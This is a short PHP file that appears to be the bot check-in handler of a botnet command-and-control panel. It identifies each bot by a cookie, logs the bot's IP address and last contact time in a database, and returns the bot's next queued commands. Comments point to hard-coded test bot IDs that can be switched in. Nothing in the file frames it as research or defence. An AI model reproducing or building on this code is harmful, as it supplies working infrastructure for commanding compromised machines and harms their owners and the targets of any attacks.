<?php
	if (isset($_COOKIE["uniqueid"])) { // comment this line
		$UID = $_COOKIE["uniqueid"]; //uncomment "268cdafa3a2136afaf96d9c7b30996d5d21ed3cd";
		//$UID = "74f9fd2bd1b3403ff53aee450f7b5435ea174c75";
		$UID_S = DB::Escape($UID);
		$Override = array(
			"WHERE"	=>	"UniqueID = '$UID_S'");
		$Bots = Bot::Find($Override);
		
		if (count($Bots) == 1) {
			$Bot = $Bots[0];
			$Bot->Set("LastReq_Date", time());
			$Bot->Set("IP", IP);
			$Bot->Save();
			$this->Output = $Bot->runNextCommands();
		}
	}
?>